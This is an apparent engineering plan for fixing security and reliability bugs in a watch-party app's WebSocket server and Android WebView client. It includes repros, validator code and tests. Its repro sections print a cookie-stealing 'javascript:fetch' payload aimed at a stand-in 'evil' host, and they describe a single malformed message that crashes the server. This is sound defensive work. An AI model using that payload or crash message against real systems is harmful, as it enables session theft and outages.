# P0 Security & Reliability Fixes — Implementation Plan

**Date:** 2026-08-02
**Branch:** `fix/p0-security-reliability` (off `main`)
**Source:** code review of `main` @ e8b69c1

---

## Scope decision (read this first)

The review flagged five P0s. **Steps 0–5 (fixes 1, 2, 4) shipped 2026-08-02.**
Fix 5 was split out at the user's request. P0-3 (WebSocket
authentication) is deliberately deferred to its own plan:

| #   | Fix                                 | In this batch?  | Why                                                                                                                                                                                                                                                                                                                                                  |
| --- | ----------------------------------- | --------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1   | WS message validation + crash guard | ✅              | Verified remote kill; server-only; non-breaking                                                                                                                                                                                                                                                                                                      |
| 2   | Host role continuity on reconnect   | ✅              | Verified; server-only; non-breaking                                                                                                                                                                                                                                                                                                                  |
| 4   | `videoUrl` scheme validation        | ✅              | Two small diffs, both unit-testable                                                                                                                                                                                                                                                                                                                  |
| 5   | Narrow `onPermissionRequest`        | ❌ **split out** | Merge gate is a real-DRM smoke test on all four services, which needs the emulator. Held for a session that can drive it; the analysis below stands, the code change is unwritten.                                                                                                                                                                                                                                                                                                              |
| 3   | **WS authentication**               | ❌ **deferred** | Protocol change: breaks all 27 server tests, `test-page.html`, `guest-test.html`, `host-sim.js`, `room.html`, and **every installed APK**. Server deploys instantly on Render; the app ships on a release cycle — a hard cutover bricks existing installs. Needs a staged rollout (send `deviceId` → observe → enforce), which is a plan of its own. |

Mixing #3 into this batch would block four verified, low-risk fixes behind a
migration. Ship these first; #3 next.

---

## Learnings applied

- **L003** — every fix below opens with an explicit failure timeline.
- **L001** — fixes 1 and 2 have executed repros, not inferred ones (output inline).
- **L006** — all verification runs against a local server; nothing touches Render until merge.
- **L015** — verification commands capture real exit codes; no `| tail` swallowing failures.
- **L036** — Gradle runs via the detached Windows Scheduled Task, not directly.
- **L004** — critique output gets verified against the code, not accepted at face value.

---

## Fix 1 — A single WebSocket message kills the server

### Failure timeline (verified)

```
t=0     any socket sends {type:"join", roomId:"A", displayName:"H"}  → role=host
t=1ms   sends {type:"state-update", time:"12.5", paused:false}
t=2ms   server.js:878  role check passes (sender is host)
t=3ms   server.js:886  Object.assign(state, {time:"12.5"})   ← string poisons room state
t=4ms   server.js:913  `${msg.time?.toFixed(2)}`
                       msg.time is "12.5" → `?.` passes (not nullish)
                       → .toFixed is undefined → TypeError, thrown SYNCHRONOUSLY
t=5ms   no try/catch in the ws 'message' listener; not a promise, so the
        unhandledRejection handler at server.js:467 never sees it
        → uncaughtException → process exits          ← ROOT CAUSE
t=6ms   every socket in every room drops; Render restarts after ~10-30s
```

Executed repro:

```
A: joined role = host
A: health before = true
TypeError: msg.time?.toFixed is not a function   at server.js:913:58
A: health AFTER string time = false
```

Root cause is two independent gaps: **(a)** no type validation at the message
boundary, **(b)** no process-level backstop. Fix both — (a) alone leaves the next
unvalidated field as the next kill switch.

Note `logState` (server.js:543) has the identical `state.time?.toFixed(2)` and
would crash on already-poisoned state, so validation must reject _before_ the
`Object.assign`.

### Changes

**New `server/validate.js`** — pure, no I/O, unit-testable:

```js
const MAX_URL_LEN = 2048;
const MAX_TIME_SEC = 604800; // 7 days — beyond any real runtime

function parseStateUpdate(msg) {
  const time = msg.time;
  if (
    typeof time !== "number" ||
    !Number.isFinite(time) ||
    time < 0 ||
    time > MAX_TIME_SEC
  )
    return { ok: false, reason: "bad-time" };
  if (typeof msg.paused !== "boolean")
    return { ok: false, reason: "bad-paused" };
  let videoUrl = msg.videoUrl;
  if (videoUrl !== undefined && videoUrl !== null) {
    if (typeof videoUrl !== "string" || videoUrl.length > MAX_URL_LEN)
      return { ok: false, reason: "bad-url" };
    if (!isNavigableUrl(videoUrl))
      return { ok: false, reason: "bad-url-scheme" };
  } else videoUrl = undefined;
  return { ok: true, time, paused: msg.paused, videoUrl };
}

// Shared with Fix 4 — a host must not be able to push javascript:/file:/data: at a guest.
function isNavigableUrl(raw) {
  try {
    const u = new URL(raw);
    return u.protocol === "http:" || u.protocol === "https:";
  } catch {
    return false;
  }
}
```

**`server/server.js`:**

1. state-update branch: `const v = parseStateUpdate(msg); if (!v.ok) { log; return; }`
   then assign from `v`, never from `msg`. Preserve the existing `videoUrl` when
   `v.videoUrl` is undefined rather than writing `undefined` over it.
2. Wrap the entire `ws.on("message")` body in try/catch → log + return.
3. Add `process.on("uncaughtException", ...)` that logs and keeps serving.
4. Replace bare `.toFixed(2)` interpolations with a `fmt(n)` helper that tolerates
   any type (belt-and-braces once validation is in — a log line must never be able
   to take the process down).

**Revised after critique — `uncaughtException` logs and exits (`process.exit(1)`),
it does not keep serving.** The draft argued for staying alive to avoid a total
outage. That reasoning doesn't hold: once (2)'s try/catch wraps message handling,
attacker-supplied input can no longer _reach_ the top-level handler, so exiting
does not reopen the DoS this fix exists to close. Anything that still escapes is
genuinely unknown, and a clean Render restart beats serving from corrupted state
while masking the bug. (2) is the actual fix; (3) is a loud, honest backstop.

Exact placement — the try/catch must wrap the **entire** listener body, including
the broadcast calls, so a throw mid-relay cannot escape:

```js
ws.on("message", (raw) => {
  try {
    // ...existing parse + all message-type branches, unchanged...
  } catch (err) {
    console.error(
      `[${roomId || "?"}] handler threw on type=${msg?.type} from ${clientId}:`,
      err,
    );
  }
});
```

And the log-safety helper, so no log line can ever take the process down:

```js
const fmt = (n) =>
  typeof n === "number" && Number.isFinite(n) ? n.toFixed(2) : String(n);
```

Replaces every bare `.toFixed(2)` interpolation (server.js:543, 913).

### Tests — `server/test/state-update.test.js` (new)

Tests drive a real server via `test/harness.js` over a WebSocket — they assert on
observable protocol behavior, not by importing `validate.js` directly, so step 1
can be written and made to fail before `validate.js` exists.

Each asserts **the server is still healthy afterwards** (the crash is the bug, not the reject):

- `time` as string / `NaN` / `Infinity` / negative / absent
- `paused` as string `"false"` / absent
- `videoUrl` as a 5000-char string / `javascript:` / non-string
- valid update still relays to the guest (no regression)
- a rejected update leaves prior room state untouched

---

## Fix 2 — A host reconnect leaves the room with zero hosts

### Failure timeline (verified)

```
t=0     host H joins empty room R      → room.size 0 → role=host
t=1s    guest G joins                  → room.size 1 → role=guest
t=30s   H's mobile network blips → OkHttp onFailure → scheduleReconnect
t=32s   H reopens and re-sends join with the SAME clientId "h"
t=32s   server.js:803  byId.has("h") → true
        server.js:812  room.delete(staleSocket)     ← H's host role deleted with it
                       stale.close(1000,"replaced")
t=32s   server.js:818  role = room.size === 0 ? "host" : "guest"
                       room.size is 1 (G) → "guest"          ← ROOT CAUSE
t=32s   stale socket's close handler fires:
                       leaving = room.get(staleWs) = undefined (already evicted)
                       → `leaving?.role === "host"` is false → promoteNewHost NOT called
RESULT  room = [G:guest, H:guest] — zero hosts.
        H's state-update is rejected by the role check at server.js:878.
        Sync is dead until the room empties and the 5-min grace expires.
```

Executed repro:

```
B: initial host role = host  /  initial guest role = guest
B: RECONNECTED host got role = guest
B: number of hosts in room = 0
B: state-updates guest received after reconnect = 0
```

`WatchPartyManager.scheduleReconnect` drives this automatically, so it fires on
any ordinary mobile network blip.

### Change — `server/server.js` join handler

```js
let priorRole = null;
if (byId.has(clientId)) {
  const stale = byId.get(clientId);
  priorRole = room.get(stale)?.role ?? null; // ← capture BEFORE eviction
  room.delete(stale);
  try {
    stale.close(1000, "replaced");
  } catch {}
}
const role = priorRole ?? (room.size === 0 ? "host" : "guest");
```

Plus an invariant guard after insertion — cheap insurance against any other path
that could strand a room:

```js
if (![...room.values()].some((c) => c.role === "host")) promoteNewHost(roomId);
```

**Why this can't create two hosts** (rewritten — the critique found the original
explanation confusing; this reasoning goes in a code comment too):

There are exactly two ways a socket leaves a room, and they are mutually exclusive
because each removes the state the other depends on:

| Path                                       | What runs                                                           | `byId` entry after           | Can promote?                                                                          |
| ------------------------------------------ | ------------------------------------------------------------------- | ---------------------------- | ------------------------------------------------------------------------------------- |
| **A — reconnect eviction** (join handler)  | `room.delete(stale)`, then `byId.set()` overwrites                  | points at the **new** socket | No — close handler's `leaving` is `undefined`, so `leaving?.role === "host"` is false |
| **B — genuine disconnect** (close handler) | `room.delete(ws)`, `byId.delete(leaving.id)`, then `promoteNewHost` | **gone**                     | Yes — and a later rejoin finds no stale entry, so `priorRole` is `null`               |

Path A restores the prior role and never promotes. Path B promotes and leaves
nothing for a rejoin to restore. Only one can happen per socket.

**No interleaving is possible.** `stale.close()` does not invoke the close handler
synchronously — it queues the `close` event for a later tick. Node's event loop is
single-threaded, so the join handler always runs to completion first; the close
handler cannot observe a half-built room or preempt role assignment. The critique
raised this as a possible race; it is not one.

The invariant guard above is therefore _cheap insurance against unknown paths_,
not a fix for a real race. A test asserts the invariant directly regardless.

### Tests — `server/test/host-continuity.test.js` (new)

- host reconnects while a guest is present → role `host`, **exactly one** host, and the guest receives its next `state-update`
- host disconnects fully → guest promoted → old host rejoins → role `guest`, exactly one host
- guest reconnects → stays `guest`, host unchanged
- reconnect into an empty room → `host`

---

## Fix 4 — `videoUrl` from the socket is navigated to unvalidated

### Failure timeline — **revised after critique; there are TWO injection paths**

The draft only covered path B. Path A is the more dangerous one and was missed.

**Path A — poison via `join` (verified, no host role or state-update needed):**

```
t=0    attacker opens a WS and joins room R (no auth today — see deferred P0-3)
       {type:"join", roomId:"R", displayName:"E", videoUrl:"javascript:…"}
t=0    server.js:748  const { platform, videoUrl } = msg;   ← NO validation
       server.js:784  roomState.set(R, { platform, videoUrl, … })  ← state poisoned
t=5m   victim joins the same room, as a guest
       server.js:837  joined payload carries videoUrl straight from roomState
t=5m   WatchPartyManager "joined" → applies because role=="guest"  (WPM.kt:157)
       → onSyncCommand → shouldReload → webView.loadUrl("javascript:…")
```

Executed repro:

```
victim joined.videoUrl = "javascript:fetch('https://evil/'+document.cookie)"
reaches Android onSyncCommand -> shouldReload -> loadUrl = true
GET /api/room/X = {"roomId":"X","active":true,"count":2,"platform":"hotstar",
                   "videoUrl":"javascript:fetch('https://evil/'+document.cookie)", …}
```

The attacker only needs to join **first** and then leave; the poison persists in
`roomState` for the whole 5-minute grace window and is served to every later
joiner. It also leaks through the unauthenticated `GET /api/room/:id`.

**Path B — poison via `state-update`** (requires host role):

```
t=1s   room is empty → attacker is assigned host
t=2s   sends state-update videoUrl="javascript:fetch('https://evil/'+document.cookie)"
t=2s   server relays verbatim; guest: MainActivity.onSyncCommand (MainActivity.kt:580)
       SyncPolicy.shouldReload("javascript:…", "https://hotstar.com/…", …)
         normalizeUrl("javascript:…") → URI parses, uri.host is null
                                      → returns the raw string unchanged
         → != guest's normalized URL → not in cooldown → returns TRUE
t=2s   webView.loadUrl("javascript:…")   ← executes in the CURRENT page's origin,
                                           with the user's hotstar/netflix session
                                           cookies and HwpBridge bound
```

Defense in depth — fix both ends. The server fix alone still leaves a malicious
_server_ able to do this; the client fix alone still lets bad data propagate and
still leaks it via `/api/room/:id`.

### Changes

**Server — `state-update` path:** covered by `isNavigableUrl` in Fix 1's validator.

**Server — `join` path (new, was missing):** the join handler must validate before
writing `roomState`. Reject the _fields_, not the join itself — a bad `videoUrl`
shouldn't stop someone watching together:

```js
const platform =
  typeof msg.platform === "string" && msg.platform.length <= 32
    ? msg.platform
    : null;
const videoUrl =
  typeof msg.videoUrl === "string" &&
  msg.videoUrl.length <= MAX_URL_LEN &&
  isNavigableUrl(msg.videoUrl)
    ? msg.videoUrl
    : null;
```

This also closes the `/api/room/:id` leak, since that endpoint just reflects
`roomState`.

**Android — `SyncPolicy.kt`,** keeping the logic in the pure object so it stays
JVM-unit-testable (uses `java.net.URI`, not `android.net.Uri`, deliberately):

```kotlin
private val NAVIGABLE_SCHEMES = setOf("http", "https")

/** A URL we are willing to hand to WebView.loadUrl. */
fun isNavigable(raw: String): Boolean = try {
    URI(raw.trim()).scheme?.lowercase() in NAVIGABLE_SCHEMES
} catch (e: Exception) { false }
```

and as the **first** guard in `shouldReload`:

```kotlin
if (!isNavigable(hostUrl)) return false
```

One guard, one call site, covered by the existing `SyncPolicyTest`.

### Tests — `SyncPolicyTest.kt`

- `shouldReload` returns false for `javascript:`, `file:`, `data:`, `intent:`, `content:`, `about:blank`, and a bare `"not a url"`
- returns true for an ordinary `https://` content change (no regression)
- `isNavigable` accepts `HTTP://`/`Https://` (case-insensitive), rejects empty/blank

### Tests — server side (`server/test/state-update.test.js`)

- **path A:** attacker joins with `videoUrl:"javascript:…"` → a later joiner's
  `joined` payload carries `null`, and `GET /api/room/:id` does not leak it
- **path B:** host sends `state-update` with a `javascript:` URL → not relayed,
  prior `roomState.videoUrl` preserved
- a normal `https://` URL still flows through both paths unchanged

---

## Fix 5 — Every WebView permission request is granted

### Failure timeline

```
t=0    guest is on hotstar.com; an ad iframe or injected script calls
       navigator.mediaDevices.getUserMedia({audio:true})
t=1ms  WebChromeClient.onPermissionRequest fires
       MainActivity.kt:453 → request.grant(request.resources)   ← ROOT CAUSE
t=2ms  the page holds a live mic stream; no user prompt, no UI indication
```

Voice chat runs through LiveKit **natively**, not in the WebView — so the WebView
has no legitimate need for `RESOURCE_AUDIO_CAPTURE` or `RESOURCE_VIDEO_CAPTURE`
at all. The only thing DRM playback needs is `RESOURCE_PROTECTED_MEDIA_ID`.

### Change — `MainActivity.kt`

```kotlin
override fun onPermissionRequest(request: PermissionRequest) {
    val allowed = request.resources.filter { it == PermissionRequest.RESOURCE_PROTECTED_MEDIA_ID }
    if (allowed.isEmpty()) {
        Log.w(TAG, "WebView permission DENIED: ${request.resources.joinToString()}")
        request.deny()
    } else {
        Log.d(TAG, "WebView permission granted: ${allowed.joinToString()}")
        request.grant(allowed.toTypedArray())
    }
}
```

**This is the only fix in the batch with real regression risk** — if a platform
needs a resource we now deny, playback breaks. The critique pushed back here, and
it's right that this project has been burned by untested DRM assumptions before
(the deferred playbackRate work in memory). Mitigations, strengthened:

- **log the full requested set on every call, before filtering** — so the smoke
  test yields hard data on what each service actually asks for, rather than us
  inferring it. This is the "observe first" half of the critique's suggested
  two-rollout approach, obtained without a second rollout.
- manual playback smoke test on **all four** services is a **hard merge gate**,
  not a follow-up (execution table updated accordingly)
- must be run on a real DRM stream, not a test page — Widevine is the whole point
- if any service turns out to need more, the log tells us exactly which resource
  and we widen the allowlist by one constant — no redesign

I did **not** adopt the critique's suggestion to ship a log-only build first.
The denial path is reversible in one line and the smoke test gates the merge, so
a separate observation rollout buys confidence we already get from the gate.

---

## Execution order (TDD: red first)

| Step | Action                                                                                                        | Gate                                                                     |
| ---- | ------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------ |
| 0    | Branch `fix/p0-security-reliability`; add `"test": "node --test \"test/*.test.js\""` to `server/package.json` | `npm test` runs                                                          |
| 1    | Promote both verified repros into `server/test/` as **failing** tests                                         | 2 new failures, 27 existing still pass                                   |
| 2    | Fix 1 — `validate.js` + server guards                                                                         | new crash tests green                                                    |
| 3    | Fix 2 — role continuity + invariant guard                                                                     | host-continuity tests green                                              |
| 4    | Fix 4a — server `videoUrl` validation on **both** the `state-update` and `join` paths                         | url tests green (paths A + B)                                            |
| 5    | Fix 4b — `SyncPolicy.isNavigable` + `SyncPolicyTest`                                                          | Android unit tests green                                                 |
| 6    | Fix 5 — `onPermissionRequest` + full-request logging                                                          | **smoke test passes on all four services, real DRM streams** — hard gate |
| 7    | Full verification (below)                                                                                     | all green                                                                |

Steps 2–5 are independent; only step 1 must precede them.

## Verification (L006 local-first, L015 real exit codes)

```bash
cd server && npm test; echo "SERVER TESTS EXIT: $?"
```

```bash
cd "C:/Users/prane_ii3rizl/Pranesh Projects/hotstar-watch-party" && node --test "tests/sync-convergence.test.js"; echo "SYNC EXIT: $?"
```

Android unit tests via the detached Scheduled Task (L036 — Gradle cannot run
directly in this environment), asserting on the explicit success marker rather
than a pipe's exit code:

```
./gradlew testDebugUnitTest  →  grep "BUILD SUCCESSFUL" in the captured log
```

Manual smoke test (Fix 5 only, per TESTING.md, driven by `tools/emu.js`):

- Hotstar, Netflix, Prime Video, YouTube — each: video plays, audio present
- two-device host/guest sync still converges
- host reconnect (toggle airplane mode ~5s) → host stays host, sync resumes ← Fix 2 end-to-end

## Critique disposition

Per **L004** (don't trust subagent results), every critique claim was checked
against the code rather than accepted.

**Accepted — plan revised:**

| Claim                                                    | Disposition                                                                                                                                                      |
| -------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `join` handler doesn't validate `platform`/`videoUrl`    | **Accepted and escalated.** Verified by repro — it's the _primary_ injection path, not a secondary one, and also leaks via `GET /api/room/:id`. Fix 4 rewritten. |
| Fix 5's gate said "compiles"                             | **Accepted.** Now a hard smoke-test gate, plus full-request logging.                                                                                             |
| `uncaughtException` should exit, not keep serving        | **Accepted.** The per-message try/catch means attacker input can't reach the top level, so exiting doesn't reopen the DoS.                                       |
| Show exact try/catch placement; define `fmt()`           | **Accepted.** Both now inline.                                                                                                                                   |
| Fix 2's mutual-exclusion explanation is confusing        | **Accepted.** Rewritten as a table; goes into a code comment too.                                                                                                |
| Document that this is partial hardening, not security    | **Accepted.** Added below and as a `server.js` comment.                                                                                                          |
| Tests might try to import `validate.js` before it exists | **Accepted.** Clarified: tests drive the server over WebSocket via `harness.js`.                                                                                 |

**Rejected — verified as incorrect:**

| Claim                                                                     | Why rejected                                                                                                                                                                                                                |
| ------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| An attacker can send `{updatedAt:"string"}` to break `projectedTime` math | **False.** `updatedAt` is always server-set (`Date.now()` at server.js:890 and :789); it is never read from `msg`. Not client-reachable.                                                                                    |
| The close handler could fire mid-join and race `promoteNewHost`           | **False.** `stale.close()` queues the `close` event; Node's event loop is single-threaded, so the join handler runs to completion first. No interleaving exists. The invariant guard stays as insurance, not as a race fix. |
| Track evictions in a separate `evicted: Map<clientId,…>`                  | **Rejected as unnecessary.** The 3-line `priorRole` capture is provably correct given the above; the extra map adds state to expire and get wrong.                                                                          |
| Ship a log-only build of Fix 5 first                                      | **Rejected.** The merge gate provides the same confidence; logging the full request set gets the data without a second rollout.                                                                                             |

**Deferred to follow-ups (good ideas, scope creep here):**

- A message-type dispatcher so no handler can be added without a validator — worth
  doing, but it restructures the WS layer and belongs with the P0-3 auth work.
- Rate limiting / backpressure on invalid messages — already logged as **P1-9**.

## Security posture after this batch — read before assuming you're safe

These four fixes are **partial hardening, not security.** Until P0-3 lands, any
room is effectively public and the following remain open (all P1 or already
logged in the review):

- anyone who learns a `roomId` can join, read all chat, and see what's playing
- the first joiner into an empty room becomes host and controls playback
- `close-app` can be sent by any member to shut down peers' apps
- chat can be spammed (validated for length, not for rate or authorization)

This is stated here and mirrored in a comment at the top of `server.js`'s
connection handler so the next person to read that code isn't misled by the
presence of validation into thinking the socket is authenticated.

## Out of scope

WS authentication (P0-3), and every P1/P2/P3 finding. Separate plans.

## Rollback

Each fix is an independent commit. Server fixes revert by redeploying the prior
Render build; Android fixes need an APK rebuild. Fix 5 is the likeliest revert
candidate and is deliberately last and self-contained.
